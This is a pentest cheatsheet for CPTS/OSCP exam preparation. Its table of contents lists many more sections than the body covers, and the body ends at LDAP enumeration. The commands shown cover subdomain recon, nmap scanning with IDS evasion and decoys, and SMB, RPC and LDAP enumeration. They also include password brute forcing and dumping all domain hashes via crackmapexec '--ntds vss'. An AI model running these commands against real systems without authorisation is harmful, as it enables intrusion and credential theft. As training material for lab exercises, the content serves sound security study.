# CPTS and OSCP CheatSheet

- [Recon](#recon)
  - [Passive ways](#passive-ways)
    - [Enumerate subdomains](#enumerate-subdomains)
      - [crt.sh](#crtsh)
      - [shodan](#shodan)
      - [dnsenum](#dnsenum)
      - [subfinder](#subfinder)
        - [Obtain subdomains](#obtain-subdomains)
      - [amass](#amass)
      - [fierce](#fierce)
      - [dnsrecon](#dnsrecon)
      - [assetfinder](#assetfinder)
      - [puredns](#puredns)
      - [Enumerating cloud resources](#enumerating-cloud-resources)
      - [Google dorking](#google-dorking)
      - [grayhatwarfare](#grayhatwarfare)
      - [Staff](#staff)
- [Reconnaissance Frameworks](#reconnaissance-frameworks)
    - [Resources](#resources)
- [Active recog](#active-recog)
  - [Ping](#ping)
  - [dns records](#dns-records)
  - [Nmap](#nmap)
    - [Nmap TCP scan](#nmap-tcp-scan)
      - [TCP Connect Scan (-sT)](#tcp-connect-scan--st)
      - [TCP-SYN Scan /Stealth Scan (-sS)](#tcp-syn-scan-stealth-scan--ss)
    - [Nmap UDP scan](#nmap-udp-scan)
    - [Nmap scripts](#nmap-scripts)
    - [Use specific scripts](#use-specific-scripts)
    - [Host Discovery](#host-discovery)
    - [Scan multiple IPs](#scan-multiple-ips)
    - [Changelogs or codename](#changelogs-or-codename)
    - [IDS and IPS Evasion](#ids-and-ips-evasion)
        - [1. TCP ACK Scan](#1-tcp-ack-scan)
        - [2. Use VPS to rotate them if there are blocked.](#2-use-vps-to-rotate-them-if-there-are-blocked)
        - [3. Use Decoys in nmap. Generate  various random IP addresss.](#3-use-decoys-in-nmap-generate--various-random-ip-addresss)
        - [4. Use specific IP address when you think that only some IP Address have access to some services.](#4-use-specific-ip-address-when-you-think-that-only-some-ip-address-have-access-to-some-services)
        - [5. DNS Proxying](#5-dns-proxying)
- [Arp-scan](#arp-scan)
- [Fingerprint](#fingerprint)
  - [Wafw00f](#wafw00f)
  - [Nikto](#nikto)
- [Attack TCP network services](#attack-tcp-network-services)
  - [Banner grabbing](#banner-grabbing)
  - [FTP](#ftp)
    - [Ftp with TLS/SSL](#ftp-with-tlsssl)
    - [SSH](#ssh)
      - [Known vulnerabilities](#known-vulnerabilities)
    - [Telnet](#telnet)
    - [DNS](#dns)
  - [SMB](#smb)
    - [nmap](#nmap)
      - [Detect EternalBlue](#detect-eternalblue)
    - [smbclient](#smbclient)
      - [Connect with null session](#connect-with-null-session)
      - [Connect with guest user](#connect-with-guest-user)
      - [Connect with a valid user (with their credentials)](#connect-with-a-valid-user-with-their-credentials)
    - [smbmap](#smbmap)
    - [netexec/crackmapexec](#netexeccrackmapexec)
  - [RPC](#rpc)
    - [rpclient](#rpclient)
      - [Enum domain users](#enum-domain-users)
      - [Enum users belonging to a group](#enum-users-belonging-to-a-group)
      - [Obtain the descriptions of all the users](#obtain-the-descriptions-of-all-the-users)
      - [Brute Forcing User RIDs](#brute-forcing-user-rids)
    - [enum4linux-ng](#enum4linux-ng)
    - [Enumeration of ldap service](#enumeration-of-ldap-service)
    - [enum users with ldapdomaindump](#enum-users-with-ldapdomaindump)
  - [Kerberos](#kerberos)
      - [Enumerate valid users](#enumerate-valid-users)
        - [Kerbrute](#kerbrute)
    - [Other techniques](#other-techniques)
      - [User and password sprying](#user-and-password-sprying)
      - [Leaked files](#leaked-files)
        - [Abusing GPP(Group Policy Preferences) Passwords](#abusing-gppgroup-policy-preferences-passwords)
    - [Extra advices](#extra-advices)
      - [If you find the name of the domain, add to the /etc/hosts](#if-you-find-the-name-of-the-domain-add-to-the-etchosts)
  - [DNS](#dns)
  - [Virtual hosting](#virtual-hosting)
    - [gobuster](#gobuster)
    - [Feroxbuster](#feroxbuster)
    - [ffuf](#ffuf)
  - [NFS](#nfs)
  - [SMTP](#smtp)
    - [Validate users](#validate-users)
      - [smtp-user-enum](#smtp-user-enum)
    - [nmap scripts](#nmap-scripts)
    - [IMAP / POP3](#imap--pop3)
      - [cURL](#curl)
      - [interact POP3 with TLS](#interact-pop3-with-tls)
    - [Default credentals](#default-credentals)
      - [POP3 commands](#pop3-commands)
      - [Interact IMAP with TLS](#interact-imap-with-tls)
      - [IMAP commands](#imap-commands)
    - [SNMP](#snmp)
      - [snmpwalk](#snmpwalk)
      - [onesixtyone](#onesixtyone)
      - [braa](#braa)
    - [MySQL](#mysql)
      - [Commands](#commands)
    - [MSSQL](#mssql)
    - [Oracle TNS](#oracle-tns)
      - [Setting up ODAT](#setting-up-odat)
      - [Enumerating SID](#enumerating-sid)
        - [nmap](#nmap)
        - [ODAT](#odat)
        - [SQLplus](#sqlplus)
          - [Log In with SQLplus](#log-in-with-sqlplus)
          - [Useful commands in Oracle](#useful-commands-in-oracle)
          - [Extract password hashes](#extract-password-hashes)
          - [Upload a web shell](#upload-a-web-shell)
          - [Oracle RDBMS - File Upload](#oracle-rdbms---file-upload)
          - [Commands](#commands)
    - [IPMI](#ipmi)
      - [nmap scripts](#nmap-scripts)
      - [metasploit](#metasploit)
      - [Default password of BMCs](#default-password-of-bmcs)
      - [Obtain Password hash](#obtain-password-hash)
        - [Crack the hash](#crack-the-hash)
    - [Rsync](#rsync)
    - [R-services | rcp | rexec | rlogin | rsh | rstat | ruptime | rwho](#r-services--rcp--rexec--rlogin--rsh--rstat--ruptime--rwho)
      - [Logging using Rlogin](#logging-using-rlogin)
      - [Listing authenticated users with rusers](#listing-authenticated-users-with-rusers)
    - [RDP](#rdp)
      - [Connecting](#connecting)
        - [xfreerdp](#xfreerdp)
        - [remmina.](#remmina)
        - [rdesktop](#rdesktop)
    - [WinRM](#winrm)
      - [nmap scripts](#nmap-scripts)
      - [How to connect](#how-to-connect)
    - [WMI](#wmi)
      - [How to connect](#how-to-connect)
    - [Admin panel](#admin-panel)
    - [Squid proxy](#squid-proxy)
      - [Internal squid proxy](#internal-squid-proxy)
  - [Web enumeration](#web-enumeration)
    - [First view](#first-view)
    - [Passive](#passive)
      - [whois](#whois)
    - [Active](#active)
      - [Other useful tools for first view](#other-useful-tools-for-first-view)
        - [Banner grabbing / Web server headers](#banner-grabbing--web-server-headers)
          - [Curl](#curl)
      - [Some important path or files to check](#some-important-path-or-files-to-check)
      - [Web crawler](#web-crawler)
        - [Scrapy](#scrapy)
        - [ReconSpider](#reconspider)
      - [EyeWitness](#eyewitness)
      - [Directory file enumeration](#directory-file-enumeration)
        - [GoBuster](#gobuster)
        - [Ffuf](#ffuf)
        - [Wfuzz](#wfuzz)
      - [Certificates](#certificates)
- [Attack UDP services](#attack-udp-services)
    - [SNMP services](#snmp-services)
      - [onesixtyone](#onesixtyone)
- [Types of attack](#types-of-attack)
  - [SAMBA Relay](#samba-relay)
  - [NTLM Relay](#ntlm-relay)
    - [IPv4](#ipv4)
      - [Execute commands](#execute-commands)
    - [IPv6](#ipv6)
  - [AS-REP Roast/Roasting](#as-rep-roastroasting)
- [Post-Explotation attacks](#post-explotation-attacks)
  - [Kerberoasting attack](#kerberoasting-attack)
  - [DCSync](#dcsync)
  - [Rubeus](#rubeus)
  - [Golden ticket attack](#golden-ticket-attack)
    - [Creating a golden.kirby ticket](#creating-a-goldenkirby-ticket)
      - [Pass The Ticket](#pass-the-ticket)
    - [Using impacket-ticketer](#using-impacket-ticketer)
- [SCF files](#scf-files)
- [Bloodhound & neo4j](#bloodhound--neo4j)
- [Connection to the AD](#connection-to-the-ad)
  - [psexec](#psexec)
  - [winrm](#winrm)
- [Extra](#extra)
    - [Login in ssh with kerberos](#login-in-ssh-with-kerberos)
- [Privilage escalation](#privilage-escalation)
  - [Windows](#windows)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Kernel exploits](#kernel-exploits)
    - [Search exposed credentials](#search-exposed-credentials)
    - [Password reuse](#password-reuse)
    - [Vulnerable software](#vulnerable-software)
    - [Enumeration scripts](#enumeration-scripts)
  - [Linux](#linux)
    - [User privilage](#user-privilage)
      - [sudo command](#sudo-command)
      - [Find SUID binaries](#find-suid-binaries)
    - [SSH Keys](#ssh-keys)
      - [read id_rsa](#read-id_rsa)
      - [Add public key in authorized_keys directory](#add-public-key-in-authorized_keys-directory)
    - [Cron jobs](#cron-jobs)
    - [Search exposed credentials](#search-exposed-credentials)
    - [Password reuse](#password-reuse)
    - [Kernel exploits](#kernel-exploits)
    - [Vulnerable software](#vulnerable-software)
    - [Enumeration scripts](#enumeration-scripts)
- [Transferring files](#transferring-files)
  - [Python server and wget/curl/...](#python-server-and-wgetcurl)
  - [scp](#scp)
  - [base64](#base64)
- [Commands](#commands)
  - [Windows](#windows)
  - [Linux](#linux)
  - [Resources](#resources)
- [Transfer files](#transfer-files)
  - [Linux](#linux)
  - [Windows](#windows)
      - [Creating a smb server](#creating-a-smb-server)
  - [Both](#both)
- [Common paths](#common-paths)
  - [IIS](#iis)
    - [IIS Web](#iis-web)
    - [IIS internal](#iis-internal)
- [Shells](#shells)
  - [Bind Shell](#bind-shell)
  - [Web Shell](#web-shell)
  - [Reverse Shell](#reverse-shell)
  - [Upgrading TTY](#upgrading-tty)
- [Paths](#paths)
  - [Window](#window)
  - [Linux](#linux)
- [File transfer methods](#file-transfer-methods)
  - [Windows](#windows)
    - [Certutil](#certutil)
    - [bitsadmin](#bitsadmin)
    - [regsvr32](#regsvr32)
  - [Evasion techniques](#evasion-techniques)
    - [Download Operation attacker -> victim](#download-operation-attacker---victim)
      - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
    - [Powershell Web Downloads](#powershell-web-downloads)
      - [PowerShell DownloadFile Method](#powershell-downloadfile-method)
      - [PowerShell DownloadString - Fileless Method](#powershell-downloadstring---fileless-method)
      - [PowerShell Invoke-WebRequest](#powershell-invoke-webrequest)
      - [Different ways](#different-ways)
      - [Commons errors with powershell](#commons-errors-with-powershell)
      - [Internet explorer first-launch configuration has not been completed](#internet-explorer-first-launch-configuration-has-not-been-completed)
        - [If the SSL/TLS certificate is not trusted](#if-the-ssltls-certificate-is-not-trusted)
      - [SMB Downloads](#smb-downloads)
      - [FTP Downloads](#ftp-downloads)
    - [Upload Operation | victim -> attacker](#upload-operation--victim---attacker)
      - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
      - [PowerShell Web Uploads](#powershell-web-uploads)
        - [PowerShell Base64 Web Upload](#powershell-base64-web-upload)
      - [SMB Upload](#smb-upload)
      - [FTP Uploads](#ftp-uploads)
  - [Linux](#linux)
    - [Download operation | Attacker -> Victim](#download-operation--attacker---victim)
      - [Base64 Encoding / Decoding](#base64-encoding--decoding)
      - [Downloads with Wget and cURL](#downloads-with-wget-and-curl)
      - [Fileless Attacks using linux](#fileless-attacks-using-linux)
      - [Download with Bash (/dev/tcp)](#download-with-bash-devtcp)
      - [SSH Downloads](#ssh-downloads)
    - [Upload operations | victim -> attacker](#upload-operations--victim---attacker)
      - [Web Upload](#web-upload)
        - [Web File transfer method with python3](#web-file-transfer-method-with-python3)
        - [Web File transfer method with python2.7](#web-file-transfer-method-with-python27)
        - [Web File transfer method with php](#web-file-transfer-method-with-php)
        - [Web File transfer method with ruby](#web-file-transfer-method-with-ruby)
      - [Download the file from the target machine onto the attacker machine](#download-the-file-from-the-target-machine-onto-the-attacker-machine)
      - [SCP Upload](#scp-upload)
  - [Transferring Files with code](#transferring-files-with-code)
    - [Download](#download)
      - [Python 2](#python-2)
      - [Python3](#python3)
      - [PHP](#php)
      - [Ruby](#ruby)
      - [Perl](#perl)
      - [JavaScript](#javascript)
      - [VBScript](#vbscript)
    - [Upload](#upload)
      - [Python3](#python3)
  - [Netcat (nc) and Ncat](#netcat-nc-and-ncat)
    - [Netcat - compromised machine](#netcat---compromised-machine)
    - [Attack Host](#attack-host)
  - [PowerShell](#powershell)
    - [PowerShell Remoting | WinRM](#powershell-remoting--winrm)
      - [host with WinRM](#host-with-winrm)
  - [RDP](#rdp)
    - [Mounting a linux folder using rdesktop](#mounting-a-linux-folder-using-rdesktop)
    - [Mounting a Linux folder using xfreerdp](#mounting-a-linux-folder-using-xfreerdp)
  - [Protected File transfer](#protected-file-transfer)
    - [File encryption on Windows](#file-encryption-on-windows)
      - [Import Module Invoke-AESEncryption.ps1](#import-module-invoke-aesencryptionps1)
    - [File encryption on Linux](#file-encryption-on-linux)
  - [Catching Files over HTTP/S](#catching-files-over-https)
    - [Nginx - enabling PUT](#nginx---enabling-put)
  - [Living off the road](#living-off-the-road)
  - [Evading Detection](#evading-detection)
    - [Changing User Agent](#changing-user-agent)
    - [LOLBAS / GTFOBins](#lolbas--gtfobins)
- [Shells & Payloads](#shells--payloads)
  - [Useful resources](#useful-resources)
  - [Useful tips](#useful-tips)
- [Password attacks](#password-attacks)
  - [John The Ripper](#john-the-ripper)
    - [Cracking files](#cracking-files)
  - [Hashcat](#hashcat)
    - [Attack modes](#attack-modes)
      - [Dictionary](#dictionary)
      - [Mask](#mask)
    - [Writing custom wordlists and rules](#writing-custom-wordlists-and-rules)
    - [CeWL](#cewl)
- [Metasploit](#metasploit)
  - [Databases](#databases)
    - [Using the database](#using-the-database)
  - [plugins](#plugins)
  - [Manage multiple sessions](#manage-multiple-sessions)
  - [jobs -h](#jobs--h)
  - [Meterpreter](#meterpreter)
- [Pivoting, Tunneling and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
  - [Local Port Forward SSH](#local-port-forward-ssh)
  - [Dynamic Port Forwarding](#dynamic-port-forwarding)
  - [Proxychains](#proxychains)
  - [Ligolo-ng](#ligolo-ng)
  - [Chisel](#chisel)
- [Vulnerability scanners](#vulnerability-scanners)
  - [Nessus](#nessus)
  - [OpenVas](#openvas)
- [Sources](#sources)


# Recon

## Passive ways

### Enumerate subdomains

> [!WARNING]
> Always remember that you can enumerate subdomains in different levels.
> Detect: test.inlanefreight.htb, but it is possible that exist more vhost or > subdomains, you need to continuos scanning to discover other such as: > dev.test.inlanefreight.htb...

#### crt.sh
You can use https://crt.sh/ to obtain subdomains thanks certificate transparency
```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

Then, you need to obtain company hosted server and not hosted by a third-party providers:
```bash
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

---

blog.inlanefreight.com 10.129.24.93
inlanefreight.com 10.129.27.33
matomo.inlanefreight.com 10.129.127.22
www.inlanefreight.com 10.129.127.33
s3-website-us-west-2.amazonaws.com 10.129.95.250
```



#### shodan
Once we have the IPs, we can use https://shodan.com to obtain more information about the hosts.

```bash
# Send all the IPs to a file
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done

# Scan with shodan-cli
sergiky@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done

10.129.24.93
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T09:02:11.370085
Number of open ports:    2

Ports:
     80/tcp nginx 
    443/tcp nginx 
    
...
```

#### dnsenum

Through DNS
```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r
```

#### subfinder

##### Obtain subdomains

```bash
subfinder -d inlanefreight.com
```

#### amass

```bash
amass enum -passive -d ingenero.es
```

#### fierce

#### dnsrecon

#### assetfinder

#### puredns

#### Enumerating cloud resources
Nowadays the use of cloud such as AWS, GCP and Azure is essential. It is possible that some buckets were unauthenticated. 

- You can use google dorking.
- Inspect the source code and search for amazonaws.com and blobl.core.windows.net
#### Google dorking

To search aws
```
intext:domain.com inurl:amazonaws.com
```

Google search for azure:
```
intext:domain.com inurl:blob.core.windows.net
```

- Finding Login Pages:
    - `site:example.com inurl:login`
    - `site:example.com (inurl:login OR inurl:admin)`
- Identifying Exposed Files:
    - `site:example.com filetype:pdf`
    - `site:example.com (filetype:xls OR filetype:docx)`
- Uncovering Configuration Files:
    - `site:example.com inurl:config.php`
    - `site:example.com (ext:conf OR ext:cnf)` (searches for extensions commonly used for configuration files)
- Locating Database Backups:
    - `site:example.com inurl:backup`
    - `site:example.com filetype:sql`

#### grayhatwarfare
Once you discover one bucket, you can use pages like https://buckets.grayhatwarfare.com/ to see the content passively.

#### Staff
You can use pages like **LinkedIn or Xing** to see search about the employeer, what they are looking for in jobs.

- job post
- Employee about
- Employee Career
- GitHub


# Reconnaissance Frameworks


I considered crawler a active way, because you need
- [FinalRecon](https://github.com/thewhiteh4t/FinalRecon): 

```bash
./finalrecon.py --headers --whois --url http://inlanefreight.com
```

- [Recon-ng](https://github.com/lanmaster53/recon-ng)
- [theHarvester](https://github.com/laramies/theHarvester)
- [SpiderFoot](https://github.com/smicallef/spiderfoot)
- [OSINT Framework](https://osintframework.com/)

My own tool:
- PassiveEye


### Resources
- Inspecting the SSL certificate
- https://crt.sh. You can use curl: `curl https://crt.sh/?=google.es`
- https://dnsdumpster.com
- https://domain.glass

# Active recog

## Ping

Check the status of the host:
```bash
ping -c 1 X
```

## dns records
We can display the available DNS records where we might find more hosts.
```bash
dig any inlanefreight.com
```

Also you can use pages like https://domain.glass to obtain more information.

To perform a reverse lookup (PTR) you can use:
```bash
dig -x 134.209.24.248
```

## Nmap

### Nmap TCP scan

#### TCP Connect Scan (-sT)
```bash
sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 
```


#### TCP-SYN Scan /Stealth Scan (-sS)

Start scanning in TCP with nmap.

```bash
sudo nmap -p- --open -sS -T4 --min-rate 4500 -vvv -n -Pn -oG allPorts
```



### Nmap UDP scan

If you don't find nothing you can scan UDP ports. Take care with false positive or negatives in UDP scans.

```bash
sudo nmap -sU -T5 -Pn -n -F 10.129.2.32
```

### Nmap scripts

Run scripts to identify the version, extra information and possible vulnerabilities.

```bash
sudo nmap -p80,443,445,3309 -sCV 10.129.2.32 -oN targeted
```

To run scripts with UDP protocol.
```bash
sudo nmap -sU -p500 -sCV 10.129.2.32
```

Search scripts:
```bash
find / -type f -name ftp* 2>/dev/null | grep scripts
```

### Use specific scripts
Nmap have a widely variety of scripts, these scripts will also help you. The scripts are separeted in the following categories:
- auth
- broadcast
- brute
- default
- discovery
- dos
- exploit
- external
- fuzzer
- intrusive
- malware
- safe
- version
- vuln

You can obtain more information about their usage at https://nmap.org/book/nse-usage.html

You can find the script in `/usr/share/nmap/scripts/`, in addition, you can create your own .nse scripts.


Try first small fuzzing:
```bash
nmap --script http-enum 10.10.10.10
```

```bash
nmap --script http-enum --script-args http-enum.basepath='/dev/'
```

Then you can go with other tools

### Host Discovery

Using ICMP echo request.
```bash
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
```

### Scan multiple IPs

```bash
sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d" " -f5
```



### Changelogs or codename

For example whether you obtain the version of SSH with the scripts, `1:7.3p1-1ubuntu0.1`, also you can search in google: "1:7.3p1-1ubuntu0.1 release" or "1:7.3p1-1ubuntu0.1 codename" and will obtain the version of the operative system.

### IDS and IPS Evasion
If you don't detect nothing interesting it is possible that the network have a IPS/IDS. This can make that the ports will show as filtered or some ports are not displayed. You can use different flags to discover it.


##### 1. TCP ACK Scan
`-sA` is much harder to filter for firewall because they only send a TCP packet with only the ACK flag.

##### 2. Use VPS to rotate them if there are blocked.

##### 3. Use Decoys in nmap. Generate  various random IP addresss.

```bash
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

RND:5 -> Five random IP address.

##### 4. Use specific IP address when you think that only some IP Address have access to some services.
```bash
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
```

##### 5. DNS Proxying
In nmap we can specify the DNS servers ourselves. This is fundamental if we are in a demilitarized zone (DMZ). The company's DNS servers are usually more trusted than those from Internet. `--dns-server <ns>,<ns>`

We could use them to interact with the hosts of the network. We can use the TCP port 53 as a source port `--source-port`. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through. If the IDS/IPS trust the packet that come from the port 53.

```bash
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
```

You can use netcat to connect. Sometimes you can obtain the version:
```bash
ncat -nv --source-port 53 10.129.2.28 50000
```


You can combine flags:
```bash
sudo nmap -n -sV -p50000 10.129.50.64 -Pn --source-port 53 -f -T1 -D RND:5
```

# Arp-scan

```bash
sudo arp-scan -I tun0 --localnet
```


# Fingerprint

Obtain the server banner with curl:
```bash
curl -I inlanefreight.com
```

If try to redirect with the header Location to another page you can try to obtain their information:
```bash
curl -I https://inlanefreight.com
```


## Wafw00f
To identify WAFs we have wafw00f tool
```bash
wafw00f inlanefreight.com
```

## Nikto
Nikto is open-source web server scanner for vulnerabilities. Also we can use it for fingerprint:
```bash
nikto -h inlanefreight.com -Tuning b
```

# Attack TCP network services
## Banner grabbing
You can use different tool to quickly fingerprint a service.

Netcat is one of the most common
```bash
nc -nv 10.129.42.253 21
```

You can use the scripts of nmap
```
nmap -sV --script=banner -p21 10.10.10.0/24
```

## FTP
File Transfer Protocol running by default in port 21. FTP can has an anonymous mode activated that allow users to connect it without credenciales. Further when you use the `-sCV` parameter in nmap it run a script to see whether the mode is activated and some files or directories detected.

To use anonymous login you can use the following command:
```bash
ftp 10.129.42.253
# name anonymous
# password anonymous
```

Using passive connection.
```bash
ftp -p 10.129.42.253
```
With **-p** parameter you are using the **passive connection**. With passive connection is straightforward avoid firewall in the client (our attacker machine)

You can download all files with wget:
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

Moreover you can use Nmap scripts.

```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

### Ftp with TLS/SSL
We can use the client openssl to communicate. The good think is that we can obtain the SSL certificate, which can also show the **hostname** and **email address**.

```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

Some FTP commands:

- `cd` -> Move through directories.
- `ls` -> List content
- `ls -la` -> To see hidden files.
- `ls -R` -> Recursive listing
- `get file.txt` -> Obtain a file
- `prompt` -> Allow to retrieve multiple files
- `mget *` -> Obtain multiple files
- `exit/bye` -> Disconnect from FTP server.
- `status` -> Show an overview of the server's settings
- `put testupload.txt` -> Upload a file

To connect a host with another port
```bash
ftp 192.168.1.1 2121
```

### SSH
TCP Port 22

We have [ssh-audit](https://github.com/jtesta/ssh-audit) tool that check servier-side and client-side configuration and shows some general information and wich encryption algorithm are still used by the client or server.

The output connection can also often provide important information,
```bash
ssh -v cry0l1t3@10.129.14.132

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config 
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```

For bruteforce attack we can specify the authentication method::
```bash
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

By default, the banners start with the version of the protocol that can be applied and then the vresion of the server itself. For example, with `SSH-1.99-OpenSSH_3.9p1`, we know that we can use both protocol versions SSH-1 and SSH-2 (SSH-1-99 are both versions), and we are dealing with openSSH server version 3.9p1.

#### Known vulnerabilities
- OpenSSH 7.2p1 contained a command injection vulnerability.
-  CVE-2020-14145. 5.7-8.4 version | Allow an attacker the capability to Man-In-The-Middle and attack the initial connection attempt. This can be useful to know what machines 

If you need to connect with a id_rsa key remember to:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@server
```

### Telnet

```
telnet 10.10.10.10 2323
```


### DNS

DNS use the **port 53 open** by default

```bash
dig @10.10.10.224 realcorp.htb
```

```bash
dig @10.10.10.224 realcorp.htb ns
```


```bash
dig @10.10.10.224 realcorp.htb mx
```

Zone transfer attack
```bash
dig @10.10.10.224 realcorp.htb axfr
```

```bash
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

Brute force with a script:
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

Brute force to discover subdomains through dns with **dnsenum**
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

Remember that you can enumerate subdomains such as: `dev.inlanefreight.htb` -> `vpn.dev.inlanefreight.htb`.


If you found some domains that you don't reach to scan and a proxy.domain.htb you can image that exist another internal proxy inside the server. See more in [Internal squid proxy](#internal-squid-proxy).

## SMB

SMB use the port 445

### nmap

You can try to use specific scripts like `smb-os-discovery.nse` to discover the operating system version.
```bash
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

Use script to detect some vulnerability
````bash
sudo nmap 192.168.10.243 -p445 -sV -sS -O --script 'vuln'
````

#### Detect EternalBlue

For example, ms08-67, that is know as Eternal Blue, `smb-vuln-ms08-067`:
```bash
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010
```

### smbclient

#### Connect with null session
You can check if null session is allowed with **smbclient**:
```bash
smbclient -L 10.10.10.10 -N
```

#### Connect with guest user
Try to connect as guess user to a resource called "users".
```bash
smbclient \\\\10.129.42.253\\users
```

#### Connect with a valid user (with their credentials)

```
smbclient -U bob \\\\10.129.42.253\\users
```



Commands inside smbclient:
```
cd
get
```

Recursive download
```
smbclient //<target>/<share> -U <username> -c 'recurse ON; prompt OFF; mget *'
```

### smbmap

You can see the permission with **smbmap**:
```bash
smbmap -H 10.10.10.10
```

See the content of a shared resource with recursive flag:
```bash
smbmap -H 10.10.10.10 -r shared_folder/folder2
```

Download a file with smbmap
```bash
smbmap -H 10.10.10.10 --download file
```

Useful commands:
- `ls`
- `cd`
- `get`
- `exit`

### netexec/crackmapexec

Obtain basic information with crackmapexec/netexec:
```bash
crackmapexec smb 10.10.10.10
```

Check valid credentials:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'
```

Now you can check again shared resources:

```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --shares
```

Check SMB service of a full network with netexec/crackmapexec:
```bash
crackmapexec smb 10.10.10.10/24
```

Check domain users with crackmapexec/netexec:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'
```

Active rdp with crackmapexec:
```bash
crackmapexec smb 10.10.10.0/24 -u'Administrator' -p 'password' -M rdp -o action=enable
```

When you have the credentials of an administrator of Domain Controler it's very recommendable to obtain the hashes of all the users of the domain.
```bash
crackmapexec smb 10.10.10.10(DC IP) -u 'Administrator' -p 'password' --ntds vss
```

Bruteforce a user:
```bash
crackmapexec smb 10.10.10.10 -u 'bob' -p /usr/share/wordlist/rockyou.txt
```

It is possible that the computer doesn't have a domain, so you need to add `--local-auth`:
```bash
netexec smb 10.129.35.14 -u 'bob' -p 'Welcome1' --shares --local-auth
```

## RPC

RPC that also use the **port 445** like SMB

### rpclient
You can use rpclient to obtain more information.

> [!NOTE]
> **Things that you can do with rpcclient**
> - Enums domain users
> - Enums domain groups
> - Enums users of a group(ex: Domains admin)
> - Obtain the descriptions of the users

#### Enum domain users
Sometimes you can **enumerate with rpcclient** without valids credentials.
```bash
rpcclient -U "" 10.10.10.10 -N
```

With valid credentials:
```bash
rpcclient -U "user1234%password1234..." 10.10.10.10
```

Execute only one command. If you have some valid user in the domain you can enumerate users
```bash
rpcclient -U "user1234%password1234..." 10.10.10.10 -c 'enumdomusers'
```

```bash
rpcclient -U "domain.local\user1234%password1234..." 10.10.10.10 -c 'enumdomusers'
```

#### Enum users belonging to a group
You can check what users belong to a group, for example Domain Admins(max privilages)

First check groups with:
```bash
rpcclient -U "user1234%password1234..." 10.10.10.10 -c 'enumdomgroups'
```

Obtain rid of users belong the rid group obtained(in this case Domains Admin)
```bash
rpcclient -U "user1234%password1234..." 10.10.10.10 -c 'querygroupmem 0x200'
```

When you obtains the **rid** of the users you can check what user is with queryuser:
```bash
rpcclient -U "user1234%password1234..." 10.10.10.10 -c 'queryuser 0x1f4'
```

#### Obtain the descriptions of all the users

You can check the descriptions of the domain users.

```bash
rpcclient -U "domain.local\user1234:password1234..." 10.10.10.10 -c 'querydispinfo'
```

```bash
for rid in $(rpcclient -U "domain.local\user%password" 10.10.10.10 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n"; rpcclient -U "domain.local\user%password" 10.10.10.10 -c "queryuser $rid" | grep -E -i "user name|description" ;done
```

You have [rpcenum](https://github.com/s4vitar/rpcenum) from S4vitar.

#### Brute Forcing User RIDs
Sometimes some commands are blocked, you can brute force the RID to obtain information
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# ...
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201

```

An alternative to this is use **impacket-samrdump.py**
```bash
samrdump.py 10.129.14.128
```


### enum4linux-ng

Is a script that automates the use of several samba tools like, smbclient, rpcclient, net, nmblookup

```bash
enum4linux-ng 10.10.10.10
```

### Enumeration of ldap service

The port of LDAP is **389**

```bash
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
```

-x -> Use a simple authentication(it's more anonymous).
-H -> Indicate the ldap host.
-s base namingcontext-> Indicate the host and limit the search for only the base(root of the tree of LDAP). The namingcontext show the roots of the LDAP tree

If you found information about the domain component you can obtain more information about users, groups, OU(Organizative Units) and more with the next command:

```bash
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

